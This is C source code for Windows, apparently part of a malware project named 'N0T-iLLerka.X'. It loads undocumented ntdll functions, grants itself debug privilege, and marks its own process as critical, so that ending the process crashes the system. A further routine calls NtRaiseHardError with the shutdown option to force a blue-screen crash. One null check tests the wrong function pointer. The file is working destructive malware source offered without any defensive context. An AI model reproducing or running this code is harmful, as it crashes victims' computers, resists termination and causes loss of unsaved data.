#include "../../HeaderFiles/N0TiLLerka.h"

#define OPTION_SHUTDOWN_SYSTEM 6
#define SE_SHUTDOWN_PRIVILEGE 19
#define SE_DEBUG_PRIVILEGE 20

typedef NTSTATUS(CALLBACK* pRTLADJUSTPRIVILEGE)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
pRTLADJUSTPRIVILEGE RtlAdjustPrivilege;
typedef NTSTATUS(CALLBACK* pRTLSETPROCESSISCRITICAL)(BOOLEAN, BOOLEAN*, BOOLEAN);
pRTLSETPROCESSISCRITICAL RtlSetProcessIsCritical;
typedef NTSTATUS(CALLBACK* pNTRAISEHARDERROR)(NTSTATUS, ULONG, ULONG, PVOID*, ULONG, PUINT);
pNTRAISEHARDERROR NtRaiseHardError;

bool NTImportDLLFUNC() {
	HINSTANCE hNtdll = LoadLibrary(L"ntdll.dll");
	if (hNtdll) {
		RtlAdjustPrivilege = (pRTLADJUSTPRIVILEGE)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
		if (!RtlAdjustPrivilege) {
#ifdef DEBUG
			MessageBox(NULL, L"\"RtlAdjustPrivilege\" is invalid", L"GetProcAddress", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif
			FreeLibrary(hNtdll);
			return FALSE;
		}
		
		RtlSetProcessIsCritical = (pRTLSETPROCESSISCRITICAL)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
		if (!RtlSetProcessIsCritical) {
#ifdef DEBUG
			MessageBox(NULL, L"\"RtlSetProcessIsCritical\" is invalid", L"GetProcAddress", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif
			FreeLibrary(hNtdll);
			return FALSE;
		}

		NtRaiseHardError = (pNTRAISEHARDERROR)GetProcAddress(hNtdll, "NtRaiseHardError");
		if (!RtlAdjustPrivilege) {
#ifdef DEBUG
			MessageBox(NULL, L"\"NtRaiseHardError\" is invalid", L"GetProcAddress", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif
			FreeLibrary(hNtdll);
			return FALSE;
		}
	} else {
#ifdef DEBUG
		MessageBox(NULL, L"Couldn't load \"ntdll.dll\"", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif
		return FALSE;
	}

	FreeLibrary(hNtdll);
	return TRUE;
}

bool NTSetProcessIsCritical() {
	BOOLEAN bl;
	if (!RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &bl)) {
		if (!RtlSetProcessIsCritical(TRUE, NULL, FALSE)) {
			return TRUE;
		} else {
#ifdef DEBUG
			MessageBox(NULL, L"Couldn't set Process Critical", L"RtlSetProcessIsCritical", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif
			return FALSE;
		}
	} else {
#ifdef DEBUG
		MessageBox(NULL, L"Couldn't set Debug Privileges", L"RtlAdjustPrivilege", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif
		return FALSE;
	}

	return FALSE;
}

bool NTRaiseHardError() {
	BOOLEAN bl;
	if (!RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bl)) {
		UINT ui;
		if (NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, OPTION_SHUTDOWN_SYSTEM, &ui)) {
#ifdef DEBUG
			MessageBox(NULL, L"Failed to raise HardError", L"NtRaiseHardError", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif
			return FALSE;
		}
	} else {
#ifdef DEBUG
		MessageBox(NULL, L"Couldn't set Shutdwon Privileges", L"RtlAdjustPrivilege", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif
		return FALSE;
	}
}